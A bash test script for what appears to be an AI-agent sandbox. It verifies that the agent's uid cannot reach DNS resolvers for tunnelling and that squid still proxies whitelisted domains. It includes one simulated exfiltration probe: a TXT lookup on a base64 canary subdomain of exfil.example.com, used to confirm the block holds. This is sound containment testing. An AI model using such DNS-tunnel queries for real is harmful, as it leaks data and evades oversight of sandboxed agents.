#!/usr/bin/env bash
# Case 12: the DNS-tunnel mitigation. The agent (dev uid) must NOT be able
# to use the resolver (127.0.0.11, or any upstream :53) as an exfil/C2
# channel — unless the project explicitly set 'agent-dns: allow'
# (/etc/agent-dns). When squid is active (non-empty domain whitelist) it
# must still be able to forward: a request via the proxy for a whitelisted
# domain must answer — that proves the drop is scoped to the dev uid only.
# shellcheck source=/dev/null
. "$(dirname "$0")/../common.sh"

AGENT_DNS_FILE="/etc/agent-dns"
MODE="$(tr -d '[:space:]' < "${AGENT_DNS_FILE}" 2>/dev/null || echo deny)"
echo "agent-dns mode: ${MODE} (from ${AGENT_DNS_FILE})"

if ! command -v dig >/dev/null 2>&1; then
  echo "SKIP: dig not available in this image"
  exit 0
fi

# ---------------------------------------------------------------------------
# allow mode (explicit opt-in): the tunnel is open by configuration. Only
# verify the resolver is reachable at all (no accidental total breakage).
# ---------------------------------------------------------------------------
if [[ "${MODE}" == "allow" ]]; then
  if ! dig +time=3 +tries=1 A localhost @127.0.0.11 >/dev/null 2>&1; then
    fail "agent-dns: allow, but resolver 127.0.0.11 is unreachable at all"
  fi
  pass "agent-dns: allow (tunnel explicitly opened by config; resolver functional)"
fi

# ---------------------------------------------------------------------------
# deny mode (default): every lookup from the dev uid must come back empty.
# 127.0.0.11 is Docker's built-in resolver; the firewall drops dev :53, so
# dig must time out / return no answer section.
# ---------------------------------------------------------------------------
# Judge the tunnel by dig's EXIT CODE, not by scanning its output text:
#   rc < 9  -> a server actually answered (0 = answer, 3 = NXDOMAIN, 2 =
#              SERVFAIL, ...) => the resolver is REACHABLE => tunnel open.
#   rc >= 9 -> dig hit a local comm-error (9) or timed out (12) => no server
#              was reached => the drop rule is in effect => blocked.
# Scanning the text would false-fail: dig prints a
#   ";; communications error to 127.0.0.11#53: connection refused"
# line to stdout even when blocked, and grepping that for an IPv4 matches the
# resolver's own address (127.0.0.11) and reports a phantom answer.
dig_reached() {
  local rc
  dig +time=3 +tries=1 "$@" >/dev/null 2>&1
  rc=$?
  [[ ${rc} -lt 9 ]]
}

if dig_reached example.com A @127.0.0.11; then
  fail "DNS tunnel STILL OPEN: dev uid reached resolver 127.0.0.11 (A example.com answered)"
fi

# The classic exfil pattern: TXT record on a data-bearing subdomain.
SUB="$(printf '%s' "ocs-canary-${RANDOM}${RANDOM}" | base64 -w0 2>/dev/null || printf '%s' "ocs-canary" | base64)"
if dig_reached "${SUB}.exfil.example.com" TXT @127.0.0.11; then
  fail "DNS tunnel STILL OPEN: dev uid reached resolver 127.0.0.11 (TXT exfil pattern answered)"
fi

# ---------------------------------------------------------------------------
# Positive check: squid (if active) must still proxy a whitelisted domain,
# i.e. its own uid keeps resolver access. Skipped when no whitelist (sectest
# has none — squid is not started at all in that case).
# ---------------------------------------------------------------------------
SQUID_OK="n/a (no whitelist / squid inactive)"
if [[ -s /etc/squid/squid-whitelist.txt ]] && command -v curl >/dev/null 2>&1; then
  DOMAIN="$(sed -n '1p' /etc/squid/squid-whitelist.txt | sed 's/^\.\?//; s/[[:space:]]*$//')"
  if [[ -n "${DOMAIN}" ]]; then
    STATUS="$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 \
      -x http://127.0.0.1:3128 "http://${DOMAIN}/" 2>/dev/null)" || STATUS=000
    case "${STATUS}" in
      2*|3*) SQUID_OK="ok (squid proxied ${DOMAIN}, HTTP ${STATUS})" ;;
      *)
        fail "squid active but CANNOT proxy whitelisted domain ${DOMAIN} (HTTP ${STATUS}) — the dev-DNS drop is too broad"
        ;;
    esac
  fi
fi

pass "agent-DNS tunnel blocked (dev uid :53 dropped); squid ${SQUID_OK}"
